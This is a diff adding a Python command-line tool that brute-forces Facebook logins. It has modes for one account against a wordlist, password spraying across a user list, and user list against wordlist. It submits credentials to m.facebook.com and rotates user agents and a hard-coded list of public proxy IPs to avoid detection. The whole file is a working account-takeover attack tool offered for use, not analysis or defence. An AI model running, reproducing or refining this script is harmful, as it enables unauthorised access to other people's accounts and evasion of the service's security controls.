@@ -1,0 +1,178 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import requests , time , os , random
+from bs4 import BeautifulSoup
+
+B  = '\033[1;34'
+C  = '\033[1;36m'
+G  = '\033[1;34m'
+OG = '\033[92m'
+LG = '\033[1;32m'
+W  = '\033[1;37m'
+R  = '\033[1;31m'
+Y  = '\033[1;33m'
+
+def banner():
+    os.system('clear')
+    print('')
+    print(R+'    フ'+Y+'ァ'+G+'ッ'+C+'ク'+OG+'ユ'+LG+'ー'+W)
+    print('')
+
+def menu():
+    print ('')
+    print (C+'  01'+R+' :'+W+' Single Target with Wordlist')
+    print (C+'  02'+R+' :'+W+' Multiple Target with Single Password')
+    print (C+'  03'+R+' :'+W+' Multiple Target with Wordlist')
+    print ('')
+    cmd = str(input(W+' Select one : '))
+    if cmd == '01' or cmd == '1':
+        singlefbbrute()
+    elif cmd == '02' or cmd == '2':
+        multifbbrute()
+    elif cmd == '03' or cmd == '3':
+        multibrute()
+
+ua = [
+    #Chrome
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
+    #Firefox
+    'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
+    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
+    'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
+    'Mozilla/5.0 (Windows NT 6.2; WOW64; Trident/7.0; rv:11.0) like Gecko',
+    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
+    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)',
+    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
+    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
+    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
+    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
+    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
+    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
+]
+
+prox = [
+    'http://3.16.22.86:90',
+    'http://52.168.34.113:80',
+    'https://103.241.227.110:6666',
+    'http://104.199.49.35:80',
+    'https://88.132.34.230:53281',
+    'http://194.67.91.153:80',
+    'http://52.250.1.171:80',
+    'http://178.18.245.74:8888',
+    'http://34.140.87.13:80',
+    'https://5.189.184.6:80',
+    'http://35.184.126.42:80',
+]
+
+def singlefbbrute():
+    banner()
+    URL = 'https://m.facebook.com/login'
+    print ('')
+    email = input(' Username : ')
+    wlist = input(' Wordlist : ')
+    banner()
+    print ('')
+    print(Y+' //'+W+' Trying to bruteforce password for '+C+email+W)
+    print('')
+    passwd = open(wlist, 'r')
+    for password in passwd:
+        form_data = {
+            'email' : email,
+            'pass' : password
+        }
+        user_agent = random.choice(ua)
+        headers = {'User-Agent': user_agent}
+        proxies_a = random.choice(prox)
+        proxies = {'http': proxies_a}
+        with requests.Session() as c:
+            c.get(URL, headers=headers, proxies=proxies)
+            r = c.post(URL, data=form_data, headers=headers, proxies=proxies)
+            b = c.get('https://m.facebook.com/home.php', headers=headers, proxies=proxies)
+            soup = BeautifulSoup(b.content, 'html.parser')
+            a = soup.find('title')
+            if(str(a) == '<title>Masuk Facebook | Facebook</title>'):
+                print(R+' [x] '+W+password,end='', flush=True)
+            elif(str(a) == '<title>Facebook</title>'):
+                print(C+' [+] '+W+password,end='', flush=True)
+                print ('')
+                print(Y+' //'+W+' Bruteforce password for '+C+email+W+' success')
+                print(Y+' //'+W+' Password -> '+C+password+W)
+
+def multifbbrute():
+    banner()
+    URL = 'https://m.facebook.com/login'
+    print ('')
+    username = input(' Userlist : ')
+    password = input(' Password : ')
+    banner()
+    print ('')
+    print(Y+' //'+W+' Trying to bruteforce users for '+C+password+W+' password')
+    print('')
+    uname = open(username, 'r')
+    for email in uname:
+        form_data = {
+            'email' : email,
+            'pass' : password
+        }
+        user_agent = random.choice(ua)
+        headers = {'User-Agent': user_agent}
+        proxies_a = random.choice(prox)
+        proxies = {'http': proxies_a}
+        with requests.Session() as c:
+            c.get(URL, headers=headers, proxies=proxies)
+            r = c.post(URL, data=form_data, headers=headers, proxies=proxies)
+            b = c.get('https://m.facebook.com/home.php', headers=headers, proxies=proxies)
+            soup = BeautifulSoup(b.content, 'html.parser')
+            a = soup.find('title')
+            if(str(a) == '<title>Masuk Facebook | Facebook</title>'):
+                print(R+' [x] '+W+email,end='', flush=True)
+            if(str(a) == '<title>Facebook</title>'):
+                print(C+' [+] '+W+email,end='', flush=True)
+
+def multibrute():
+    banner()
+    URL = 'https://m.facebook.com/login'
+    print ('')
+    username = input(' Userlist : ')
+    passwd = input(' Wordlist : ')
+    banner()
+    print ('')
+    uname = open(username, 'r')
+    for email in uname:
+        print(Y+' //'+W+' Trying to bruteforce password for '+C+email+W)
+        print('')
+        passw = open(passwd, 'r')
+        for password in passw:
+            form_data = {
+                'email' : email,
+                'pass' : password
+            }
+            user_agent = random.choice(ua)
+            headers = {'User-Agent': user_agent}
+            proxies_a = random.choice(prox)
+            proxies = {'http': proxies_a}
+            with requests.Session() as c:
+                c.get(URL, headers=headers, proxies=proxies)
+                r = c.post(URL, data=form_data, headers=headers, proxies=proxies)
+                b = c.get('https://m.facebook.com/home.php', headers=headers, proxies=proxies)
+                soup = BeautifulSoup(b.content, 'html.parser')
+                a = soup.find('title')
+                if(str(a) == '<title>Masuk Facebook | Facebook</title>'):
+                    print(R+' [x] '+W+password,end='', flush=True)
+                if(str(a) == '<title>Facebook</title>'):
+                    print(C+' [+] '+W+password,end='', flush=True)
+        print ('')
+
+banner()
+menu()
